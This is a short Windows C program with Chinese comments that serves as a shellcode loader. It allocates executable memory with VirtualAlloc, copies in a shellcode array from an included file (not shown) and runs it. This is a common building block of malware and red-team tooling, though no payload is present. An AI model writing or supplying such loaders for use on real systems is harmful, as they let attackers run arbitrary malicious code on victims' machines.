#include <stdio.h>
#include <string.h>
#include <windows.h>

#include "shellcode.c"

int main() {
    // 设置 Shellcode 的执行权限
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));

    // 执行 Shellcode
    ((void(*)())exec)();

    return 0;
}
